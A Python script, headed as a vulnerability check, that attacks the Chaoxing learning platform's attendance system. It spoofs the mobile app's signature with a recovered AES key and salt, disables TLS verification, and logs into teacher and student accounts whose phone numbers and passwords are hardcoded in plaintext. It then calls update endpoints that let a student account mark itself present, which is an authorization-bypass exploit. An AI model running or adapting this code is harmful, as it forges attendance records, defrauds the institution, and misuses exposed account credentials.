import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def run():
    print("=" * 80)
    print(f"签到活动详细分析与漏洞验证")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 详细分析所有签到活动")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []

    for i, act in enumerate(active_list):
        aid = str(act.get("id", ""))
        nameTwo = act.get("nameTwo", "")
        status = act.get("status", "")
        url = act.get("url", "")
        isLook = act.get("isLook", "")
        groupId = act.get("groupId", "")
        print(f"\n  [{i}] aid={aid}")
        print(f"      nameTwo={nameTwo}")
        print(f"      status={status}, isLook={isLook}, groupId={groupId}")
        print(f"      url={url[:120]}")

        # 查询签到状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        if isinstance(d, dict) and "data" in d:
            sign_status = d["data"].get("status")
            sign_id = d["data"].get("id")
            sign_name = d["data"].get("name", "")
            print(f"      签到: id={sign_id}, status={sign_status}, name={sign_name}")
        else:
            error_msg = d.get("errorMsg", "")
            print(f"      签到: {error_msg}")

    print("\n[3] 查找正在进行中的签到活动")
    print("=" * 80)

    # 检查活动是否正在进行（status=2通常表示进行中）
    for i, act in enumerate(active_list[:5]):
        aid = str(act.get("id", ""))
        nameTwo = act.get("nameTwo", "")

        # 尝试访问preSign页面判断活动状态
        r = s_s.get(f"{base}/newsign/preSign",
                    params={"courseId": COURSE_ID, "classId": CLASS_ID,
                            "activePrimaryId": aid, "uid": puid_s},
                    timeout=20, allow_redirects=True)
        print(f"  [{i}] aid={aid}, nameTwo={nameTwo}")
        print(f"      preSign: HTTP {r.status_code}, len={len(r.text)}")

        if r.status_code == 200 and len(r.text) > 100:
            # 提取页面中的关键信息
            title = re.findall(r'<title>([^<]+)</title>', r.text)
            print(f"      title={title}")

    print("\n[4] 使用教师账号发起签到活动")
    print("=" * 80)

    # 教师创建并启动签到
    r = s_t.post(f"{base}/ppt/activeAPI/pptActive",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t,
                       "signType": "0", "type": "2"},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  教师创建签到(pptActive): HTTP {r.status_code}, {r.text[:200]}")

    # 尝试通过newsign路径创建
    r = s_t.post(f"{base}/newsign/preSign",
                 data={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t,
                       "signType": "0"},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  教师创建签到(newsign/preSign): HTTP {r.status_code}, len={len(r.text)}")

    # 重新获取活动列表
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    new_active_list = d.get("activeList", []) if isinstance(d, dict) else []
    print(f"\n  新活动列表: {len(new_active_list)} 个活动")

    new_aids = [str(act.get("id", "")) for act in new_active_list]
    old_aids = [str(act.get("id", "")) for act in active_list]
    fresh_aids = [aid for aid in new_aids if aid not in old_aids]
    print(f"  新增活动: {fresh_aids}")

    print("\n[5] 在最新活动上测试签到状态修改")
    print("=" * 80)

    # 使用最新的活动（无论是否新建成功）
    test_aids = fresh_aids if fresh_aids else new_aids[:2]

    for aid in test_aids[:2]:
        print(f"\n--- 测试活动 {aid} ---")

        # 查询当前状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        orig = json.dumps(d, ensure_ascii=False)[:300]
        print(f"  修改前: {orig}")

        # 修改为出勤
        r = s_s.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                           "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        print(f"  修改status=1: {r.text[:100]}")

        time.sleep(1)

        # 查询修改后状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        after = json.dumps(d, ensure_ascii=False)[:300]
        print(f"  修改后: {after}")

        # 教师端确认
        r = s_t.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        teacher = json.dumps(d, ensure_ascii=False)[:300]
        print(f"  教师端: {teacher}")

        # 尝试用pptSign/updateSignStatusByUidsV2（教师端）确认
        r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": STUDENT_PUID, "status": "1", "remark": ""},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        print(f"  教师V2修改确认: {r.text[:100]}")

        time.sleep(1)

        # 再次查询
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        final = json.dumps(d, ensure_ascii=False)[:300]
        print(f"  最终状态: {final}")

    print("\n[6] 关键测试：使用/newsign/stuSignajax签到")
    print("=" * 80)

    for aid in test_aids[:2]:
        # 尝试通过stuSignajax正常签到
        r = s_s.post(f"{base}/pptSign/stuSignajax",
                     data={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                           "courseId": COURSE_ID, "lat": "", "lon": "", "address": ""},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                     timeout=20)
        print(f"  stuSignajax(aid={aid[:8]}): {r.text[:100]}")

        time.sleep(1)

        # 查询签到状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        print(f"  签到后状态: {json.dumps(d, ensure_ascii=False)[:300]}")

    print("\n[7] 分析/newsign/updateSignStatus的响应真实性")
    print("=" * 80)

    # 测试一个明显不存在的activeId
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": "9999999999999"},
                 data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                       "activeId": "9999999999999", "classId": CLASS_ID, "courseId": COURSE_ID,
                       "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  不存在的activeId: {r.text[:100]}")

    # 测试空activeId
    r = s_s.post(f"{base}/newsign/updateSignStatus",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId"},
                 data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                       "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  空activeId: HTTP {r.status_code}, {r.text[:100]}")

    # 对比：/pptSign/updateSignStatusByUidsV2对不存在activeId的响应
    r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                 params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": "9999999999999"},
                 data={"uids": STUDENT_PUID, "status": "1", "remark": ""},
                 headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                          "Content-Type": "application/x-www-form-urlencoded"},
                 timeout=20)
    print(f"  V2不存在activeId: {r.text[:100]}")

    print("\n[8] 使用signedResult页面查看签到结果")
    print("=" * 80)

    for aid in test_aids[:2]:
        r = s_t.get(f"{base}/pptSign/signedResult",
                    params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID},
                    headers={"Referer": f"{base}/"},
                    timeout=20, allow_redirects=True)
        print(f"  教师signedResult(aid={aid[:8]}): HTTP {r.status_code}, len={len(r.text)}")

        if r.status_code == 200 and len(r.text) > 100:
            # 提取签到结果
            status_refs = re.findall(r'status["\s:=]+(\d)', r.text)
            name_refs = re.findall(r'"name"\s*:\s*"([^"]+)"', r.text)
            print(f"    status值: {status_refs[:10]}")
            print(f"    names: {name_refs[:5]}")

if __name__ == "__main__":
    run()
